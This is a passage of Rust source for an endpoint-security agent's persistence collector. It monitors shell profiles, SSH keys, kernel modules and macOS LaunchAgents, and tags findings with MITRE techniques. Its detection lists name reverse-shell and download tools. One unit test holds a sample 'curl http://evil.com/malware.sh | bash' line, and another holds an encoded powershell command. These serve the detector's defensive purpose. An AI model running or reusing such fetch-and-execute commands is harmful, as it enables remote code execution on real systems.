            PersistenceType::SshAuthorizedKey
        } else if path_lower.contains("at")
            && (path_lower.contains("spool") || path_lower.contains("atjobs"))
        {
            PersistenceType::AtJob
        } else if path_lower.contains("autostart") || path_lower.ends_with(".desktop") {
            PersistenceType::XdgAutostart
        } else if path_lower.contains("udev") && path_lower.ends_with(".rules") {
            PersistenceType::UdevRule
        } else if path_lower.contains("modules") || path_lower.contains("modprobe") {
            PersistenceType::KernelModule
        } else if path_lower.contains("motd") {
            PersistenceType::MotdScript
        } else {
            PersistenceType::Other
        }
    }

    #[cfg(target_os = "linux")]
    async fn monitor_user_profiles(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use notify::{Event, EventKind, RecursiveMode, Watcher};

        let (notify_tx, mut notify_rx) = tokio::sync::mpsc::channel(100);

        let mut watcher = match notify::recommended_watcher(move |res: notify::Result<Event>| {
            if let Ok(event) = res {
                let _ = notify_tx.blocking_send(event);
            }
        }) {
            Ok(w) => w,
            Err(e) => {
                warn!(error = %e, "Failed to create user profile watcher");
                return;
            }
        };

        // Watch home directories
        let profile_files = [
            ".bashrc",
            ".bash_profile",
            ".profile",
            ".zshrc",
            ".zprofile",
        ];

        if let Ok(entries) = std::fs::read_dir("/home") {
            for entry in entries.flatten() {
                let home = entry.path();
                for profile in &profile_files {
                    let profile_path = home.join(profile);
                    if profile_path.exists() {
                        let _ = watcher.watch(&profile_path, RecursiveMode::NonRecursive);
                    }
                }
            }
        }

        // Watch root profiles
        for profile in &profile_files {
            let profile_path = PathBuf::from("/root").join(profile);
            if profile_path.exists() {
                let _ = watcher.watch(&profile_path, RecursiveMode::NonRecursive);
            }
        }

        while let Some(event) = notify_rx.recv().await {
            for path in &event.paths {
                let operation = match event.kind {
                    EventKind::Create(_) => "create",
                    EventKind::Modify(_) => "modify",
                    EventKind::Remove(_) => "delete",
                    _ => continue,
                };

                let content = std::fs::read_to_string(path).unwrap_or_default();
                let value = Self::extract_suspicious_content(&content);

                let (pid, process_name, process_path) = Self::get_current_process_info();
                let username = whoami::username();

                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();
                let location = path
                    .parent()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();

                if let Some(event) = Self::create_persistence_event(
                    PersistenceType::ShellProfile,
                    &location,
                    &name,
                    &value,
                    operation,
                    pid,
                    &process_name,
                    &process_path,
                    "",
                    &username,
                ) {
                    let _ = tx.send(event).await;
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    async fn monitor_ssh_keys(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use notify::{Event, EventKind, RecursiveMode, Watcher};

        let (notify_tx, mut notify_rx) = tokio::sync::mpsc::channel(100);

        let mut watcher = match notify::recommended_watcher(move |res: notify::Result<Event>| {
            if let Ok(event) = res {
                let _ = notify_tx.blocking_send(event);
            }
        }) {
            Ok(w) => w,
            Err(e) => {
                warn!(error = %e, "Failed to create SSH key watcher");
                return;
            }
        };

        // Watch .ssh directories
        if let Ok(entries) = std::fs::read_dir("/home") {
            for entry in entries.flatten() {
                let ssh_dir = entry.path().join(".ssh");
                if ssh_dir.exists() {
                    let _ = watcher.watch(&ssh_dir, RecursiveMode::NonRecursive);
                }
            }
        }

        // Root's .ssh
        let root_ssh = PathBuf::from("/root/.ssh");
        if root_ssh.exists() {
            let _ = watcher.watch(&root_ssh, RecursiveMode::NonRecursive);
        }

        while let Some(event) = notify_rx.recv().await {
            for path in &event.paths {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();

                // Only care about authorized_keys files
                if !name.contains("authorized_keys") {
                    continue;
                }

                let operation = match event.kind {
                    EventKind::Create(_) => "create",
                    EventKind::Modify(_) => "modify",
                    EventKind::Remove(_) => "delete",
                    _ => continue,
                };

                let content = std::fs::read_to_string(path).unwrap_or_default();

                // Count keys
                let key_count = content
                    .lines()
                    .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
                    .count();

                let value = format!("{} SSH keys", key_count);

                let (pid, process_name, process_path) = Self::get_current_process_info();
                let username = whoami::username();

                let location = path
                    .parent()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();

                if let Some(event) = Self::create_persistence_event(
                    PersistenceType::SshAuthorizedKey,
                    &location,
                    &name,
                    &value,
                    operation,
                    pid,
                    &process_name,
                    &process_path,
                    "",
                    &username,
                ) {
                    let _ = tx.send(event).await;
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    async fn monitor_kernel_modules_periodic(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
    ) {
        use std::time::Duration;

        let mut interval = tokio::time::interval(Duration::from_secs(60));

        loop {
            interval.tick().await;

            if let Ok(content) = std::fs::read_to_string("/proc/modules") {
                let mut entries = known_entries.write().await;

                for line in content.lines() {
                    if let Some(module_name) = line.split_whitespace().next() {
                        let key = format!("module:{}", module_name);

                        if !entries.contains_key(&key) {
                            // New module loaded
                            let (pid, process_name, process_path) =
                                Self::get_current_process_info();
                            let username = whoami::username();

                            if let Some(event) = Self::create_persistence_event(
                                PersistenceType::KernelModule,
                                "/proc/modules",
                                module_name,
                                "loaded",
                                "create",
                                pid,
                                &process_name,
                                &process_path,
                                "",
                                &username,
                            ) {
                                let _ = tx.send(event).await;
                            }

                            entries.insert(key, "loaded".to_string());
                        }
                    }
                }
            }
        }
    }

    // ========================================================================
    // macOS Implementation
    // ========================================================================

    #[cfg(target_os = "macos")]
    async fn baseline_macos(known_entries: &Arc<tokio::sync::RwLock<HashMap<String, String>>>) {
        let mut entries = known_entries.write().await;

        // LaunchAgents and LaunchDaemons
        let launch_paths = vec![
            "/Library/LaunchAgents",
            "/Library/LaunchDaemons",
            "/System/Library/LaunchAgents",
            "/System/Library/LaunchDaemons",
        ];

        for path in launch_paths {
            if let Ok(dir_entries) = std::fs::read_dir(path) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    if let Ok(content) = std::fs::read_to_string(&file_path) {
                        let key = file_path.to_string_lossy().to_string();
                        let hash = Self::hash_content(&content);
                        entries.insert(key, hash);
                    }
                }
            }
        }

        // User LaunchAgents
        if let Ok(home) = std::env::var("HOME") {
            let user_launch = format!("{}/Library/LaunchAgents", home);
            if let Ok(dir_entries) = std::fs::read_dir(&user_launch) {
                for entry in dir_entries.flatten() {
                    let file_path = entry.path();
                    if let Ok(content) = std::fs::read_to_string(&file_path) {
                        let key = file_path.to_string_lossy().to_string();
                        let hash = Self::hash_content(&content);
                        entries.insert(key, hash);
                    }
                }
            }
        }

        debug!(count = entries.len(), "macOS baseline scan complete");
    }

    #[cfg(target_os = "macos")]
    async fn start_macos_monitors(
        tx: mpsc::Sender<TelemetryEvent>,
        known_entries: Arc<tokio::sync::RwLock<HashMap<String, String>>>,
        _config: AgentConfig,
    ) {
        use notify::{Event, EventKind, RecursiveMode, Watcher};
        use std::time::Duration;

        let launch_paths = vec!["/Library/LaunchAgents", "/Library/LaunchDaemons"];

        let (notify_tx, mut notify_rx) = tokio::sync::mpsc::channel(100);

        let mut watcher = match notify::recommended_watcher(move |res: notify::Result<Event>| {
            if let Ok(event) = res {
                let _ = notify_tx.blocking_send(event);
            }
        }) {
            Ok(w) => w,
            Err(e) => {
                warn!(error = %e, "Failed to create macOS watcher");
                return;
            }
        };

        for path in &launch_paths {
            if Path::new(path).exists() {
                let _ = watcher.watch(Path::new(path), RecursiveMode::NonRecursive);
            }
        }

        // User LaunchAgents
        if let Ok(home) = std::env::var("HOME") {
            let user_launch = format!("{}/Library/LaunchAgents", home);
            if Path::new(&user_launch).exists() {
                let _ = watcher.watch(Path::new(&user_launch), RecursiveMode::NonRecursive);
            }
        }

        while let Some(event) = notify_rx.recv().await {
            for path in &event.paths {
                let operation = match event.kind {
                    EventKind::Create(_) => "create",
                    EventKind::Modify(_) => "modify",
                    EventKind::Remove(_) => "delete",
                    _ => continue,
                };

                let (pid, process_name, process_path) = Self::get_current_process_info();
                let username = whoami::username();

                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_default();
                let location = path
                    .parent()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();

                let value = std::fs::read_to_string(path).unwrap_or_default();

                if let Some(event) = Self::create_persistence_event(
                    PersistenceType::Other,
                    &location,
                    &name,
                    &value,
                    operation,
                    pid,
                    &process_name,
                    &process_path,
                    "",
                    &username,
                ) {
                    let _ = tx.send(event).await;
                }
            }
        }
    }

    // ========================================================================
    // Helper Functions
    // ========================================================================

    /// Hash content for change detection
    fn hash_content(content: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(content.as_bytes());
        hex::encode(hasher.finalize())
    }

    /// Calculate SHA256 hash of a file
    async fn calculate_file_hash(path: &str) -> Result<String> {
        use sha2::{Digest, Sha256};
        use std::io::Read;

        let mut file = std::fs::File::open(path)?;
        let mut hasher = Sha256::new();
        let mut buffer = [0u8; 8192];

        loop {
            let bytes_read = file.read(&mut buffer)?;
            if bytes_read == 0 {
                break;
            }
            hasher.update(&buffer[..bytes_read]);
        }

        Ok(hex::encode(hasher.finalize()))
    }

    /// Extract suspicious content snippets for logging
    fn extract_suspicious_content(content: &str) -> String {
        let suspicious_patterns = [
            "curl",
            "wget",
            "python",
            "perl",
            "bash -c",
            "sh -c",
            "base64",
            "eval",
            "exec",
            "nc ",
            "netcat",
            "/dev/tcp",
            "reverse",
            "shell",
            "payload",
            "exploit",
            "powershell",
            "-enc",
            "downloadstring",
            "invoke-expression",
            "iex",
            "certutil",
            "bitsadmin",
            "mshta",
            "rundll32",
        ];

        for line in content.lines() {
            let line_lower = line.to_lowercase();
            for pattern in &suspicious_patterns {
                if line_lower.contains(pattern) {
                    return line.chars().take(200).collect();
                }
            }
        }

        // Return first non-comment line
        for line in content.lines() {
            let trimmed = line.trim();
            if !trimmed.is_empty() && !trimmed.starts_with('#') && !trimmed.starts_with(';') {
                return trimmed.chars().take(100).collect();
            }
        }

        "(empty or comments only)".to_string()
    }

    /// Get information about the current process
    fn get_current_process_info() -> (u32, String, String) {
        let pid = std::process::id();

        #[cfg(target_os = "linux")]
        {
            let name = std::fs::read_to_string(format!("/proc/{}/comm", pid))
                .map(|s| s.trim().to_string())
                .unwrap_or_else(|_| "unknown".to_string());

            let path = std::fs::read_link(format!("/proc/{}/exe", pid))
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| "unknown".to_string());

            return (pid, name, path);
        }

        #[cfg(target_os = "windows")]
        {
            let path = std::env::current_exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| "unknown".to_string());

            let name = std::path::Path::new(&path)
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string());

            return (pid, name, path);
        }

        #[cfg(target_os = "macos")]
        {
            let path = std::env::current_exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| "unknown".to_string());

            let name = std::path::Path::new(&path)
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| "unknown".to_string());

            return (pid, name, path);
        }

        #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
        {
            (pid, "unknown".to_string(), "unknown".to_string())
        }
    }

    /// Create a persistence telemetry event
    fn create_persistence_event(
        persistence_type: PersistenceType,
        location: &str,
        name: &str,
        value: &str,
        operation: &str,
        pid: u32,
        process_name: &str,
        process_path: &str,
        process_cmdline: &str,
        username: &str,
    ) -> Option<TelemetryEvent> {
        Self::create_persistence_event_with_hash(
            persistence_type,
            location,
            name,
            value,
            operation,
            pid,
            process_name,
            process_path,
            process_cmdline,
            username,
            None,
        )
    }

    /// Create a persistence telemetry event with optional payload hash
    fn create_persistence_event_with_hash(
        persistence_type: PersistenceType,
        location: &str,
        name: &str,
        value: &str,
        operation: &str,
        pid: u32,
        process_name: &str,
        process_path: &str,
        process_cmdline: &str,
        username: &str,
        payload_hash: Option<String>,
    ) -> Option<TelemetryEvent> {
        let mitre_technique = persistence_type.mitre_technique().to_string();
        let mitre_tactic = persistence_type.mitre_tactic().to_string();
        let description = persistence_type.description();
        let base_severity = persistence_type.severity();

        let persistence_event = PersistenceEvent {
            persistence_type: persistence_type.clone(),
            location: location.to_string(),
            name: name.to_string(),
            value: value.to_string(),
            operation: operation.to_string(),
            pid,
            process_name: process_name.to_string(),
            process_path: process_path.to_string(),
            process_cmdline: process_cmdline.to_string(),
            mitre_technique: mitre_technique.clone(),
            mitre_tactic: mitre_tactic.clone(),
            username: username.to_string(),
            payload_hash,
            metadata: HashMap::new(),
        };

        let event_type = if operation == "delete" {
            EventType::PersistenceRemove
        } else {
            EventType::PersistenceInstall
        };

        let mut event = TelemetryEvent::new(
            event_type,
            base_severity.clone(),
            EventPayload::Persistence(persistence_event),
        );

        // Add detection
        event.add_detection(Detection {
            detection_type: DetectionType::Persistence,
            rule_name: format!(
                "persistence_{}",
                mitre_technique.to_lowercase().replace('.', "_")
            ),
            confidence: 0.85,
            description: format!(
                "{} persistence detected: {} in {}",
                description, name, location
            ),
            mitre_tactics: mitre_tactic.split(", ").map(String::from).collect(),
            mitre_techniques: vec![mitre_technique],
        });

        // Check for suspicious patterns in value
        let value_lower = value.to_lowercase();
        let suspicious_indicators = [
            ("powershell", "PowerShell execution", 0.95),
            ("-enc", "Encoded command", 0.98),
            ("-encodedcommand", "Encoded command", 0.98),
            ("base64", "Base64 encoding", 0.90),
            ("hidden", "Hidden execution", 0.85),
            ("bypass", "Security bypass", 0.95),
            ("downloadstring", "Download operation", 0.95),
            ("invoke-expression", "Dynamic execution", 0.95),
            ("iex", "Dynamic execution", 0.90),
            ("curl", "Network download", 0.80),
            ("wget", "Network download", 0.80),
            ("/dev/tcp", "Reverse shell", 0.99),
            ("nc ", "Netcat usage", 0.95),
            ("netcat", "Netcat usage", 0.95),
            ("mshta", "MSHTA execution", 0.95),
            ("rundll32", "Rundll32 usage", 0.85),
            ("certutil", "Certutil abuse", 0.90),
            ("bitsadmin", "BITS abuse", 0.90),
            ("regsvr32", "Regsvr32 abuse", 0.85),
        ];

        for (pattern, desc, confidence) in &suspicious_indicators {
            if value_lower.contains(pattern) {
                event.add_detection(Detection {
                    detection_type: DetectionType::Behavioral,
                    rule_name: format!(
                        "persistence_suspicious_{}",
                        pattern.replace(' ', "_").replace('-', "_")
                    ),
                    confidence: *confidence,
                    description: format!("Suspicious pattern in persistence: {}", desc),
                    mitre_tactics: vec!["Execution".to_string(), "Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1059".to_string(), "T1027".to_string()],
                });

                // Elevate severity if suspicious patterns found
                event.severity = Severity::Critical;
                break;
            }
        }

        Some(event)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_persistence_type_mitre_mapping() {
        assert_eq!(
            PersistenceType::RegistryRunKey.mitre_technique(),
            "T1547.001"
        );
        assert_eq!(
            PersistenceType::ScheduledTask.mitre_technique(),
            "T1053.005"
        );
        assert_eq!(
            PersistenceType::WindowsService.mitre_technique(),
            "T1543.003"
        );
        assert_eq!(PersistenceType::Crontab.mitre_technique(), "T1053.003");
        assert_eq!(
            PersistenceType::SystemdService.mitre_technique(),
            "T1543.002"
        );
        assert_eq!(
            PersistenceType::SshAuthorizedKey.mitre_technique(),
            "T1098.004"
        );
        assert_eq!(PersistenceType::LdSoPreload.mitre_technique(), "T1574.006");
        assert_eq!(
            PersistenceType::ImageFileExecutionOptions.mitre_technique(),
            "T1546.012"
        );
        assert_eq!(PersistenceType::KernelModule.mitre_technique(), "T1547.006");
    }

    #[test]
    fn test_persistence_type_severity() {
        assert_eq!(PersistenceType::LsaPackage.severity(), Severity::Critical);
        assert_eq!(PersistenceType::LdSoPreload.severity(), Severity::Critical);
        assert_eq!(PersistenceType::WmiSubscription.severity(), Severity::High);
        assert_eq!(PersistenceType::RegistryRunKey.severity(), Severity::Medium);
        assert_eq!(PersistenceType::StartupFolder.severity(), Severity::Medium);
    }

    #[test]
    fn test_hash_content() {
        let hash1 = PersistenceCollector::hash_content("test content");
        let hash2 = PersistenceCollector::hash_content("test content");
        let hash3 = PersistenceCollector::hash_content("different content");

        assert_eq!(hash1, hash2);
        assert_ne!(hash1, hash3);
        assert_eq!(hash1.len(), 64); // SHA256 hex = 64 chars
    }

    #[test]
    fn test_extract_suspicious_content() {
        let content = "# Comment\ncurl http://evil.com/malware.sh | bash";
        let extracted = PersistenceCollector::extract_suspicious_content(content);
        assert!(extracted.contains("curl"));

        let safe_content = "# Just a comment\n# Another comment";
        let extracted = PersistenceCollector::extract_suspicious_content(safe_content);
        assert!(extracted.contains("empty") || extracted.contains("comment"));
    }

    #[test]
    fn test_create_persistence_event() {
        let event = PersistenceCollector::create_persistence_event(
            PersistenceType::RegistryRunKey,
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "Malware",
            r"C:\Windows\Temp\evil.exe",
            "create",
            1234,
            "reg.exe",
            r"C:\Windows\System32\reg.exe",
            "reg add ...",
            "SYSTEM",
        );

        assert!(event.is_some());
        let event = event.unwrap();
        assert_eq!(event.event_type, EventType::PersistenceInstall);
        assert!(!event.detections.is_empty());
    }

    #[test]
    fn test_suspicious_pattern_elevates_severity() {
        let event = PersistenceCollector::create_persistence_event(
            PersistenceType::ScheduledTask,
            "TaskScheduler",
            "EvilTask",
            "powershell -enc SGVsbG8gV29ybGQ=",
            "create",
            1234,
            "schtasks.exe",
            "",
            "",
            "Administrator",
        );

        assert!(event.is_some());
        let event = event.unwrap();
        assert_eq!(event.severity, Severity::Critical);
        assert!(event.detections.len() >= 2); // Base detection + suspicious pattern
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_determine_linux_persistence_type() {
        assert_eq!(
            PersistenceCollector::determine_linux_persistence_type("/etc/cron.d/evil"),
            PersistenceType::Crontab
        );
        assert_eq!(
            PersistenceCollector::determine_linux_persistence_type(
                "/etc/systemd/system/evil.service"
            ),
            PersistenceType::SystemdService
        );
        assert_eq!(
            PersistenceCollector::determine_linux_persistence_type("/etc/ld.so.preload"),
            PersistenceType::LdSoPreload
        );
        assert_eq!(
            PersistenceCollector::determine_linux_persistence_type("/home/user/.bashrc"),
            PersistenceType::ShellProfile
        );
    }
}
